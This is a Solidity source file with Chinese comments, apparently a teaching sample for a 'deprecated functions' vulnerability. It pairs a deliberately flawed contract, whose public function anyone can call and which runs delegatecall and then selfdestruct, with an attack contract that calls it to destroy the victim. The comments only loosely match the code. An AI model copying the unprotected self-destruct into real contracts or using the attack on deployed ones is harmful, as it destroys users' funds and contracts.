// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/*
    漏洞名稱：Use of Deprecated Functions
    描述：
    本範例展示如何使用已過時的函式（在原版 Solidity 0.4.24 中存在的問題）。
    原程式碼中使用了已過時或不安全的函式，例如 sha3 (改用 keccak256)、throw (改用 revert 或 require)、
    callcode (改用 delegatecall)、var (改用明確型別) 以及 suicide (改用 selfdestruct)。
    請注意：在 Solidity >=0.8.0 中，這些功能已經改進或移除，但此示範仍以模擬方式展示漏洞風險。
*/

contract DeprecatedSimpleVulnerable {
    // 漏洞重點：本函式使用了過時的寫法，可能導致安全性問題。
    function useDeprecated() public {
        // 使用 blockhash：無漏洞，但原始代碼寫法不佳
        bytes32 bh = blockhash(block.number - 1);
        
        // 漏洞示範：原寫法使用已過時的 sha3 函式，這裡用 keccak256 但標示其原有缺點
        // 原寫法： bytes32 hashofhash = sha3(bh);
        bytes32 hashOfHash = keccak256(abi.encodePacked(bh));
        
        // 漏洞示範：原始代碼中使用了 msg.gas，此處使用 gasleft() 模擬，但邏輯仍存漏洞
        uint gasAmount = gasleft();
        if (gasAmount == 0) {
            // 原始使用 throw，這裡改為 revert 以呈現程式邏輯
            revert("Gas is 0");
        }
        
        // 漏洞示範：使用過時且危險的 callcode 概念，在 solidity >=0.8.0 中不存在 callcode
        // 此處用 delegatecall 模擬原有行為，但其安全性仍存疑
        (bool success, ) = address(this).delegatecall(abi.encodeWithSignature("dummy()"));
        require(success, "Delegatecall failed");
        
        // 漏洞示範：使用隱含型別 (var) 問題，此處用明確型別呈現，但原理有缺陷
        uint8[3] memory a = [1, 2, 3];
        
        // 漏洞示範：多變數賦值可能存在不安全問題
        (bool x, string memory y, uint8 z) = (false, "test", 0);
        
        // 漏洞重點：使用已過時的 suicide（現 selfdestruct）導致合約銷毀
        selfdestruct(payable(address(0)));
    }

    // 為了完整測試，提供一個 dummy 函式供 delegatecall 使用
    function dummy() public pure {}

    // 定義 fallback 與 receive 以便接收 Ether
    fallback() external payable {}
    receive() external payable {}
}

// 攻擊合約：利用受害合約的 useDeprecated 函式來觸發自殺操作，造成合約銷毀
contract AttackDeprecated {
    DeprecatedSimpleVulnerable public vulnerableContract;

    // 攻擊者需提供受害合約地址
    constructor(address payable _vulnerableAddress) {
        vulnerableContract = DeprecatedSimpleVulnerable(_vulnerableAddress);
    }

    // 攻擊方法，呼叫漏洞函式
    function attack() public {
        vulnerableContract.useDeprecated();
    }

    // 能夠接收 Ether 的 fallback 與 receive
    fallback() external payable {}
    receive() external payable {}
}
